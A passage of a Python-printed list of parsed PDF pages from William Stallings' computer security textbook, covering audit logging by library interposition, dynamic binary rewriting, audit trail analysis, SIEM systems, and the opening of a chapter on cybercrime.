elsewhere)\\n(b) Macro used in function\\n1 #define AUDIT_LOOKUP_COMMAND(t,n,p,e)\\n2 p=(t)dlsym(RTLD_NEXT,n);\\n3 if (p==NULL) {\\n4 perror(“looking up command”);\\n5 syslog(LOG_INFO,“could not find %s in library: %m”,n);\\n6 return(e);\\n7 }\\nM18_STAL0611_04_GE_C18.indd   590 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 592, 'page_label': '591'}, page_content='18.3 / IMPLEMENTING THE LOGGING FUNCTION  591\\nDynamic Binary Rewriting\\nThe interposition technique is designed to work with dynamically linked shared \\nlibraries. It cannot intercept function calls of statically linked programs unless all \\nprograms in the system are relinked at the time that the audit library is introduced. \\n[ZHOU04] describes a technique, referred to as dynamic binary rewriting, that can \\nbe used with both statically and dynamically linked programs.\\nDynamic binary rewriting is a postcompilation technique that directly changes \\nthe binary code of executables. The change is made at load time and modifies only the \\nmemory image of a program, not the binary program file on secondary storage. As \\nwith the interposition technique, dynamic binary rewriting does not require recom-\\npilation of the application binary. Audit module selection is postponed until the \\napplication is invoked, allowing for flexible selection of the auditing configuration.\\nThe technique is implemented on Linux using two modules: a loadable kernel \\nmodule, and a monitoring daemon. Linux is structured as a collection of modules, \\na number of which can be automatically loaded and unloaded on demand. These \\nrelatively independent blocks are referred to as loadable modules  [GOYE99]. In \\nessence, a module is an object file whose code can be linked to and unlinked from \\nthe kernel at run time. Typically, a module implements some specific function, such \\nas a file system, a device driver, or some other feature of the kernel’s upper layer. A \\nmodule does not execute as its own process or thread, although it can create kernel \\nthreads for various purposes as necessary. Rather, a module is executed in kernel \\nmode on behalf of the current process.\\nFigure 18.9 shows the structure of this approach. The kernel module ensures \\nnon-bypassable instrumentation by intercepting the execve() system call. The \\nexecve() function loads a new executable into a new process address space and \\nbegins executing it. By intercepting this call, the kernel module stops the applica -\\ntion before its first instruction is executed, and can insert the audit routines into the \\napplication before its execution starts.\\nThe actual instrumentation of an application is performed by the monitoring \\ndaemon, which is a privileged user-space process. The daemon manages two reposi-\\ntories: a patch repository, and an audit repository. The patch repository contains the \\ncode for instrumenting the monitored applications. The audit repository contains \\nthe auditing code to be inserted into an application. The code in both the audit and \\nthe patch repositories is in the form of dynamic libraries. By using dynamic libraries, \\nit is possible to update the code in the libraries while the daemon is still running. In \\naddition, multiple versions of the libraries can exist at the same time.\\nThe sequence of events is as follows:\\n1. A monitored application is invoked by the execve() system call.\\n2. The kernel module intercepts the call, stops the application, and sets the process’s \\nparent to the monitoring daemon. Then, the kernel module notifies the user-space \\ndaemon that a monitored application has started.\\n3. The monitoring daemon locates the patch and audit library functions appropri-\\nate for this application. The daemon loads the audit library functions into the \\napplication’s address space and inserts audit function calls at certain points in the \\napplication’s code.\\nM18_STAL0611_04_GE_C18.indd   591 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 593, 'page_label': '592'}, page_content='592  CHAPTER 18 / SECURITY AUDITING\\n4. Once the application has been instrumented, the daemon enables the applica-\\ntion to begin execution.\\nA special language was developed to simplify the process of creating audit \\nand patch code. In essence, patches can be inserted at any point of function call to \\na shared library routine. The patch can invoke audit routines and also invoke the \\nshared library routine, in a manner logically similar to the interposition technique \\ndescribed earlier.\\n 18.4 AUDIT TRAIL ANALYSIS\\nPrograms and procedures for audit trail analysis vary widely, depending on the system \\nconfiguration, the areas of most concern, the software available, the security policy \\nof the organization, and the behavior patterns of legitimate users and intruders. This \\nsection provides some observations concerning audit trail analysis.\\nPreparation\\nTo perform useful audit analysis, the analyst or security administrator needs an \\nunderstanding of the information available and how it can be used. NIST SP 800-92 \\noffers some useful advice in this regard, which we summarize in this subsection.\\nunderStAnding Log entrieS The security administrator (or other individual \\nreviewing and analyzing logs) needs to understand the context surrounding  individual \\nlog entries. Relevant information may reside in other entries in the same log, entries \\nFigure 18.9 Run-Time Environment for Application Auditing\\nMonitoring\\ndaemon\\nAudit\\nlibraries\\nPatch\\nlibraries\\nNotify\\nexecve()\\nKernel module\\nOperating system kernel\\nApplicationInstrument\\n3\\n2\\n1\\n4\\n3\\nM18_STAL0611_04_GE_C18.indd   592 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 594, 'page_label': '593'}, page_content='18.4 / AUDIT TRAIL ANALYSIS  593\\nin other logs, and nonlog sources such as configuration management entries. The \\nadministrator should understand the potential for unreliable entries, such as from a \\nsecurity package that is known to generate frequent false positives when looking for \\nmalicious activity.\\nMost audit file formats contain a mixture of plain language plus cryptic mes -\\nsages or codes that are meaningful to the software vendor but not necessarily to the \\nadministrator. The administrator must make the effort to decipher as much as pos -\\nsible the information contained in the log entries. In some cases, log analysis software \\nperforms a data reduction task that reduces the burden on the administrator. Still, the \\nadministrator should have a reasonable understanding of the raw data that feeds into \\nanalysis and review software in order to be able to assess the utility of these packages.\\nThe most effective way to gain a solid understanding of log data is to review \\nand analyze portions of it regularly (e.g., every day). The goal is to eventually gain \\nan understanding of the baseline of typical log entries, likely encompassing the vast \\nmajority of log entries on the system.\\nunderStAnding the context To perform effective reviews and analysis, admin-\\nistrators should have solid understanding of each of the following from training or \\nhands-on experience:\\n• The organization’s policies regarding acceptable use, so administrators can \\nrecognize violations of the policies.\\n• The security software used by their hosts, including the types of security-related \\nevents that each program can detect and the general detection profile of each \\nprogram (e.g., known false positives).\\n• The operating systems and major applications (e.g., e-mail, Web) used by their \\nhosts, particularly each OS’s and major application’s security and logging capa-\\nbilities and characteristics.\\n• The characteristics of common attack techniques, especially how the use of \\nthese techniques might be recorded on each system.\\n• The software needed to perform analysis, such as log viewers, log reduction \\nscripts, and database query tools.\\nTiming\\nAudit trails can be used in multiple ways. The type of analysis depends, at least in part, \\non when the analysis is to be done. The possibilities include the following:\\n• Audit trail review after an event: This type of review is triggered by an observed \\nevent, such as a known system or application software problem, a known viola-\\ntion of existing security policy by a user, or some unexplained system or user \\nproblem. The review can gather information to elaborate on what is known \\nabout the event, to diagnose the cause or the problem, and to suggest remedial \\naction and future countermeasures. This type of review focuses on the audit trail \\nentries that are relevant to the specific event.\\n• Periodic review of audit trail data: This type of review looks at all of the audit \\ntrail data or at defined subsets of the data, and has many possible objectives. \\nExamples of objectives include looking for events or patterns that suggest a \\nM18_STAL0611_04_GE_C18.indd   593 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 595, 'page_label': '594'}, page_content='594  CHAPTER 18 / SECURITY AUDITING\\nsecurity problem, developing a profile of normal behavior and searching for \\nanomalous behavior, and developing profiles by individual user to maintain a \\npermanent record by user.\\n• Real-time audit analysis : Audit analysis tools can also be used in a real-time \\nor near-real-time fashion. Real-time analysis is part of the intrusion detection \\nfunction.\\nAudit Review\\nDistinct from an analysis of audit trail data using data reduction and analysis tools \\nis the concept of audit review. An audit review capability enables an administrator \\nto read information from selected audit records. The Common Criteria specification \\n[CCPS12a] calls for a capability that allows prestorage or poststorage audit selection \\nand includes the ability to selectively review the following:\\n• The actions of one or more users (e.g., identification, authentication, system \\nentry, and access control actions)\\n• The actions performed on a specific object or system resource\\n• All or a specified set of audited exceptions\\n• Actions associated with a specific system or security attribute\\nAudit review can be focused on records that match certain attributes, such as \\nuser or user group, time window, type of record, and so forth.\\nOne automated tool that can be useful in audit review is a prioritization of audit \\nrecords based on input from the administrator. Records can be prioritized based on \\na combination of factors. Examples include the following:\\n• Entry type (e.g., message code 103, message class CRITICAL)\\n• Newness of the entry type (i.e., Has this type of entry appeared in the logs \\nbefore?)\\n• Log source\\n• Source or destination IP address (e.g., source address on a blacklist; destination \\naddress of a critical system; previous events involving a particular IP address)\\n• Time of day or day of the week (e.g., an entry might be acceptable during cer-\\ntain times but not permitted during others)\\n• Frequency of the entry (e.g., x times in y seconds)\\nThere may be a number of possible purposes for this type of audit review. Audit \\nreview can enable an administrator to get a feel for the current operation of the sys-\\ntem and the profile of the users and applications on the system, the level of attack \\nactivity, and other usage and security-related events. Audit review can be used to gain \\nan understanding after the fact of an attack incident and the system’s response to it, \\nleading to changes in software and procedures.\\nApproaches to Data Analysis\\nThe spectrum of approaches and algorithms used for audit data analysis is far too \\nbroad to be treated effectively here. Instead, we give a feeling for some of the major \\napproaches, based on the discussion in [SING04].\\nM18_STAL0611_04_GE_C18.indd   594 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 596, 'page_label': '595'}, page_content='18.4 / AUDIT TRAIL ANALYSIS  595\\nbASic ALerting The simplest form of an analysis is for the software to give an \\nindication that a particular interesting event has occurred. If the indication is given \\nin real time, it can serve as part of an intrusion detection system. For events that may \\nnot rise to the level of triggering an intrusion alert, an after-the-fact indication of \\nsuspicious activity can lead to further analysis.\\nbASeLining Baselining is the process of defining normal versus unusual events and \\npatterns. The process involves measuring a set of known data to compute a range of \\nnormal values. These baseline values can then be compared to new data to detect \\nunusual shifts. Examples of activity to baseline include the following:\\n• Amount of network traffic per protocol: total HTTP , e-mail, FTP , and so on\\n• Logins/logouts\\n• Accesses of admin accounts\\n• Dynamic Host Configuration Pr otocol (DHCP) address management, DNS \\nrequests\\n• Total amount of log data per hour/day\\n• Number of processes running at any time\\nFor example, a large increase in FTP traffic could indicate that your FTP server \\nhas been compromised and is being used maliciously by an outsider.\\nOnce baselines are established, analysis against the baselines is possible. One \\napproach, discussed frequently in this text, is anomaly detection. An example of a sim-\\nple approach to anomaly detection is the freeware Never Before Seen (NBS) Anomaly \\nDetection Driver.4 The tool implements a very fast database lookup of strings and tells \\nyou whether a given string is in the database (i.e., has already been seen).\\nConsider the following example involving DHCP . DHCP is used for easy TCP/\\nIP configuration of hosts within a network. Upon an operation system start-up, the \\nclient host sends a configuration request that is detected by the DHCP server. The \\nDHCP server selects appropriate configuration parameters (IP address with appro-\\npriate subnet mask and other optional parameters, such as IP address of the default \\ngateway, addresses of DNS servers, domain name, etc.) for the client stations. The \\nDHCP server assigns clients IP addresses within a predefined scope for a certain \\nperiod (lease time). If an IP address is to be kept, the client must request an exten -\\nsion on the period of time before the lease expires. If the client has not required an \\nextension on the lease time, the IP address is considered free and can be assigned to \\nanother client. This is performed automatically and transparently. With NBS, it is easy \\nto monitor the organization’s networks for new medium access control/IP (MAC/IP) \\ncombinations being leased by DHCP servers. The administrator immediately learns \\nof new MACs and new IP addresses being leased that are not normally leased. This \\nmay or may not have security implications. NBS can also scan for malformed records, \\nnovel client queries, and a wide range of other patterns.\\nAnother form of baseline analysis is thresholding. Thresholding is the identifi-\\ncation of data that exceed a particular baseline value. Simple thresholding is used to \\n4See the book Web site for the link to this software.\\nM18_STAL0611_04_GE_C18.indd   595 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 597, 'page_label': '596'}, page_content='596  CHAPTER 18 / SECURITY AUDITING\\nidentify events, such as refused connections, that happen more than a certain number \\nof times. Thresholding can focus on other parameters, such as the frequency of events \\nrather than the simple number of events.\\nWindowing is detection of events within a given set of parameters, such as \\nwithin a given time period or outside a given time period—for example, baselining \\nthe time of day each user logs in and flagging logins that fall outside that range.\\ncorreLAtion Another type of analysis is correlation,  which seeks for relation -\\nships among events. A simple instance of correlation is, given the presence of one \\nparticular log message, to alert on the presence of a second particular message. \\nFor instance, if Snort (see Section 8.9) reports a buffer overflow attempt from a \\nremote host, a reasonable attempt at correlation would grab any messages that \\ncontain the remote host’s IP address. Or the administrator might want to note \\nany switch user (su) on an account that was logged into from a never-seen-before \\nremote host.\\n 18.5 SECURITY INFORMATION AND EVENT MANAGEMENT\\nThere is a need for systems that can automatically process the vast amount of \\nsecurity audit data generated by contemporary networks, servers, and hosts, in \\nlarger organizations. So much data is generated that it is essentially impossible \\nfor a person to extract timely and useful information. This includes the need to \\ncharacterize normal activity and thresholds so the system will generate alerts when \\nanomalies or malicious patterns are detected. Hence some form of integrated, auto-\\nmated, centralized logging system is required. The type of product that can address \\nthese issues is referred to as a security information and event management (SIEM) \\nsystem.\\nNIST SP 800-137 ( Information Security Continuous Monitoring (ISCM) for \\nFederal Information Systems and Organizations , September 2011) amongst other \\nstandards recognizes the need for such systems as a key security control. [TARA11] \\nnotes that a SIEM system can be configured to assist in implementing many of \\nthe “20 Critical Controls” developed by SANS and others, which we mentioned in \\nChapter 12.\\nSIEM Systems\\nSIEM software is a centralized logging software package similar to, but much more \\ncomplex than, syslog. SIEM systems provide a centralized, uniform audit trail storage \\nfacility and a suite of audit data analysis programs. NIST SP 800-92 discusses log man-\\nagement and SIEM systems. It notes there are two general configuration approaches, \\nwith many products offering a combination of the two:\\n• Agentless: The SIEM server receives data from the individual log-generating \\nhosts without needing to have any special software installed on those hosts. \\nSome servers pull logs from the hosts, which is usually done by having the server \\nauthenticate to each host and regularly retrieve its logs. In other cases, the hosts \\npush their logs to the server, which usually involves each host authenticating to \\nM18_STAL0611_04_GE_C18.indd   596 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 598, 'page_label': '597'}, page_content='18.5 / SECURITY INFORMATION AND EvENT MANAGEMENT  597\\nthe server and transferring its logs regularly. The SIEM server then performs \\nevent filtering and aggregation and log normalization and analysis on the col -\\nlected logs.\\n• Agent based: An agent program is installed on the log-generating host to per-\\nform event filtering and aggregation and log normalization for a particular type \\nof log, then transmit the normalized log data to an SIEM server, usually on a \\nreal-time or near-real-time basis for analysis and storage. If a host has multiple \\ntypes of logs of interest, then it might be necessary to install multiple agents. \\nSome SIEM products also offer agents for generic formats such as syslog and \\nSNMP . A generic agent is used primarily to get log data from a source for which \\na format-specific agent and an agentless method are not available. Some prod-\\nucts also allow administrators to create custom agents to handle unsupported \\nlog sources.\\nSIEM software is able to recognize a variety of log formats, including those \\nfrom a variety of OSs, security software (e.g., IDSs and firewalls), application \\nservers (e.g., Web servers and e-mail servers), and even physical security con -\\ntrol devices such as badge readers. The SIEM software normalizes these various \\nlog entries so the same format is used for the same data item (e.g., IP address) \\nin all entries. The software can delete fields in log entries that are not needed \\nfor the security function and log entries that are not relevant, greatly reduc -\\ning the amount of data in the central log. The SIEM server analyzes the com -\\nbined data from the multiple log sources, correlates events among the log entries, \\nidentifies and prioritizes significant events, and initiates responses to events if \\ndesired. SIEM products usually include several features to help users, such as \\nthe following:\\n• Graphical user interfaces (GUIs) that are specifically designed to assist analysts \\nin identifying potential problems and reviewing all available data related to \\neach problem\\n• A security knowledge base,  with information on known vulnerabilities, the \\nlikely meaning of certain log messages, and other technical data; log analysts \\ncan often customize the knowledge base as needed\\n• Incident tracking and reporting capabilities, sometimes with robust workflow \\nfeatures\\n• Asset information storage and corr elation (e.g., giving higher priority to an \\nattack that targets a vulnerable OS or a more important host)\\nWell-implemented SIEM systems can form a critical component in an organiza-\\ntion’s security infrastructure. However many organizations fail to appropriately \\nplan, install, and manage such systems. [HADS10] notes that an appropriate process \\nincludes defining threats, documenting responses, and configuring standard reports to \\nmeet audit and compliance requirements. Appendices in this paper provide examples \\nof each of these that can be adapted and extended for a given organization. All of \\nthese can be done as part of a wider IT security risk assessment process that we \\ndiscussed in Chapters 14 and 15. This paper also lists a number of vendors of SIEM \\nproducts.\\nM18_STAL0611_04_GE_C18.indd   597 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 599, 'page_label': '598'}, page_content='598  CHAPTER 18 / SECURITY AUDITING\\nReview Questions\\n 18.1 Explain the difference between a security audit message and a security alarm.\\n 18.2 List and briefly describe the elements of a security audit and alarms model.\\n 18.3 List and briefly describe the principal security auditing functions.\\n 18.4 In what areas (categories of data) should audit data be collected?\\n 18.5 List and explain the differences among four different categories of audit trails.\\n 18.6 What are the two key features of an audit trail protection system?\\n 18.7 Explain how an interposable library can be used for application-level auditing.\\n 18.8 Explain the difference between audit review and audit analysis.\\n 18.9 Explain the terms baselining, thresholding, and winnowing.\\nProblems\\n 18.1 Compare Tables 18.2 and 18.3. Discuss the areas of overlap and the areas that do not \\noverlap and their significance.\\na. Are there items found in Table 18.2 not found in Table 18.3? Discuss their justification.\\nb. Are there items found in Table 18.3 not found in Table 18.2? Discuss their justification.\\n 18.2 Another list of auditable events, from [KUPE04], is shown in Table 18.6. Compare this \\nwith Tables 18.2 and 18.3.\\na. Are there items found in Tables 18.2 and 18.3 not found in Table 18.6? Discuss \\ntheir justification.\\nb. Are there items found in Table 18.6 not found in Tables 18.2 and 18.3? Discuss \\ntheir justification.\\n 18.3 Does MARS work in agent-based or agentless configuration? What is NetFlow and is \\nit compatible with MARS?\\n 18.6 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nanomaly detection\\napplication-level audit trail\\naudit\\naudit review\\naudit trail\\naudit trail analysis\\nbaselining\\ndynamic binary rewriting\\ndynamically linked shared \\nlibrary\\ninterposable library\\nloadable modules\\nlog\\nphysical access audit trail\\nsecurity audit\\nsecurity audit trail\\nsecurity information and \\nevent management \\n(SIEM)\\nshared library\\nstatically linked library\\nstatically linked shared library\\nsyslog\\nsystem-level audit trail\\nthresholding\\nuser-level audit trail\\nwindowing\\nM18_STAL0611_04_GE_C18.indd   598 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 600, 'page_label': '599'}, page_content='18.6 / KEY TERMS, REvIEW QUESTIONS, AND PROBLEMS  599\\nIdentification and authentication\\n• password changed\\n• failed login events\\n• successful login attempts\\n• terminal type\\n• login location\\n• user identity queried\\n• login attempts to nonexistent \\naccounts\\n• terminal used\\n• login type (interactive/  \\nautomatic)\\n• authentication method\\n• logout time\\n• total connection time\\n• reason for logout\\nOS operations\\n• auditing enabled\\n• attempt to disable auditing\\n• attempt to change audit config\\n• putting an object into another \\nusers memory space\\n• deletion of objects from other \\nusers memory space\\n• change in privilege\\n• change in group label\\n• “sensitive” command usage\\nSuccessful program access\\n• command names and arguments\\n• time of use\\n• day of use\\n• CPU time used\\n• wall time elapsed\\n• files accessed\\n• number of files accessed\\n• maximum memory used\\nFailed Program Access\\nSystemwide parameters\\n• systemwide CPU activity (load)\\n• systemwide disk activity\\n• systemwide memory usage\\nFile accesses\\n• file creation\\n• file read\\n• file write\\n• file deletion\\n• attempt to access another users \\nfiles\\n• attempt to access “sensitive” files\\n• failed file accesses\\n• permission change\\n• label change\\n• directory modification\\nInfo on files\\n• name\\n• timestamps\\n• type\\n• content\\n• owners\\n• group\\n• permissions\\n• label\\n• physical device\\n• disk block\\nUser interaction\\n• typing speed\\n• typing errors\\n• typing intervals\\n• typing rhythm\\n• analog of pressure\\n• window events\\n• multiple events per location\\n• multiple locations with events\\n• mouse movements\\n• mouse clicks\\n• idle times\\n• connection time\\n• data sent from terminal\\n• data sent to terminal\\nHardcopy printed\\nNetwork activity\\n• packet received\\n• protocol\\n• source address\\n• destination address\\n• source port\\n• destination port\\n• length\\n• payload size\\n• payload\\n• checksum\\n• flags\\n• port opened\\n• port closed\\n• connection requested\\n• connection closed\\n• connection reset\\n• machine going down\\nTable 18.6 Suggested List of Events to Be Audited\\nM18_STAL0611_04_GE_C18.indd   599 10/11/17   3:10 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 601, 'page_label': '600'}, page_content='19.1 Cybercrime and Computer Crime\\nTypes of Computer Crime\\nLaw Enforcement Challenges\\nWorking with Law Enforcement\\n19.2 Intellectual Property\\nTypes of Intellectual Property\\nIntellectual Property Relevant to Network and Computer Security\\nDigital Millennium Copyright Act\\nDigital Rights Management\\n19.3 Privacy\\nPrivacy Law and Regulation\\nOrganizational Response\\nComputer Usage Privacy\\nPrivacy, Data Surveillance, Big Data, and Social Media\\n19.4 Ethical Issues\\nEthics and the IS Professions\\nEthical Issues Related to Computers and Information Systems\\nCodes of Conduct\\nThe Rules\\n19.5 Key Terms, Review Questions, and Problems\\nLegal and Ethical Aspects\\nCHAPTER \\n \\n600\\nM19_STAL0611_04_GE_C19.indd   600 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 602, 'page_label': '601'}, page_content='19.1 / CYBERCRIME AND COMPUTER CRIME  601\\nThe legal and ethical aspects of computer security encompass a broad range of topics, \\nand a full discussion is well beyond the scope of this book. In this chapter, we touch \\non a few important topics in this area.\\n 19.1 CYBERCRIME AND COMPUTER CRIME\\nThe bulk of this text examines technical approaches to the detection, prevention, \\nand recovery from computer and network attacks. Chapters 16 and 17 examined \\nphysical and human-factor approaches, respectively, to strengthening computer \\nsecurity. All of these measures can significantly enhance computer security but \\ncannot guarantee complete success in detection and prevention. One other tool is \\nthe deterrent factor of law enforcement. Many types of computer attacks can be \\nconsidered crimes and, as such, carry criminal sanctions. This section begins with \\na classification of types of computer crime, then looks at some of the unique law \\nenforcement challenges of dealing with computer crime.\\nTypes of Computer Crime\\nComputer crime, or cybercrime, is a term used broadly to describe criminal activity \\nin which computers or computer networks are a tool, a target, or a place of criminal \\nactivity.1 These categories are not exclusive, and many activities can be character -\\nized as falling in one or more categories. The term cybercrime has a connotation of \\nthe use of networks specifically, whereas computer crime  may or may not involve \\nnetworks.\\nThe U.S. Department of Justice [DOJ00] categorizes computer crime based on \\nthe role that the computer plays in the criminal activity, as follows:\\n• Computers as targets: This form of crime targets a computer system, to acquire \\ninformation stored on that computer system, to control the target system \\n without authorization or payment (theft of service),  or to alter the integrity \\nof data or interfere with the availability of the computer or server. Using the \\n terminology of Chapter 1, this form of crime involves an attack on data integrity, \\nsystem integrity, data confidentiality, privacy, or availability.\\n1This definition is from the New York Law School Course on Cybercrime, Cyberterrorism, and Digital \\nLaw Enforcement (information-retrieval.info/cybercrime/index.html).\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Discuss the different types of computer crime.\\n ◆ Understand the types of intellectual property.\\n ◆ Present an overview of key issues in the area of privacy.\\n ◆ Compare and contrast various approaches to codifying computer ethics.\\nM19_STAL0611_04_GE_C19.indd   601 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 603, 'page_label': '602'}, page_content='602  CHAPTER 19 / LEgAL AND ETHICAL AsPECTs\\n• Computers as storage devices : Computers can be used to further unlawful \\n activity by using a computer or a computer device as a passive storage medium. \\nFor example, the computer can be used to store stolen password lists, credit card \\nor calling card numbers, proprietary corporate information, pornographic image \\nfiles, or “warez” (pirated commercial software).\\n• Computers as communications tools : Many of the crimes falling within this \\ncategory are simply traditional crimes that are committed online. Examples \\ninclude the illegal sale of prescription drugs, controlled substances, alcohol, and \\nguns; fraud; gambling; and child pornography.\\nA more specific list of crimes, shown in Table 19.1, is defined in the international \\nConvention on Cybercrime.2 This is a useful list because it represents an international \\nconsensus on what constitutes computer crime, or cybercrime, and what crimes are \\nconsidered important.\\nYet another categorization is used in the CERT 2007 E-crime Survey, the \\nresults of which are shown in Table 19.2. The figures in the second column indicate \\nthe percentage of respondents who report at least one incident in the correspond -\\ning row category. Entries in the remaining three columns indicate the percentage of \\nrespondents who reported a given source for an attack.3\\nLaw Enforcement Challenges\\nThe deterrent effect of law enforcement on computer and network attacks correlates \\nwith the success rate of criminal arrest and prosecution. The nature of cybercrime \\nis such that consistent success is extraordinarily difficult. To see this, consider what \\n[KSHE06] refers to as the vicious cycle of cybercrime, involving law enforcement \\nagencies, cybercriminals, and cybercrime victims.\\nFor law enforcement agencies , cybercrime presents some unique difficulties. \\nProper investigation requires a fairly sophisticated grasp of the technology. Although \\nsome agencies, particularly larger agencies, are catching up in this area, many \\n jurisdictions lack knowledgeable and experienced investigators in dealing with this \\nkind of crime. Lack of resources represents another handicap. Some cybercrime inves-\\ntigations require considerable computer processing power, communications capacity, \\nand storage capacity, which may be beyond the budget of individual jurisdictions. \\nThe global nature of cybercrime is an additional obstacle: Many crimes will involve \\nperpetrators who are remote from the target system, in another jurisdiction, or even \\nanother country. A lack of collaboration and cooperation with remote law enforce-\\nment agencies can greatly hinder an investigation. Initiatives such as international \\nConvention on Cybercrime are a promising sign. The Convention at least introduces \\na common terminology for crimes and a framework for harmonizing laws globally.\\n2The 2001 Convention on Cybercrime is the first international treaty seeking to address Internet crimes by \\nharmonizing national laws, improving investigative techniques, and increasing cooperation among nations. \\nIt was developed by the Council of Europe and has been ratified by 43 nations, including the United \\nStates. The Convention includes a list of crimes that each signatory state must transpose into its own law.\\n3Note that the sum of the figures in the last three columns for a given row may exceed 100%, because a \\nrespondent may report multiple incidents in multiple source categories (e.g., a respondent experiences \\nboth insider and outsider denial-of-service attacks).\\nM19_STAL0611_04_GE_C19.indd   602 10/11/17   3:19 PM'),\n",
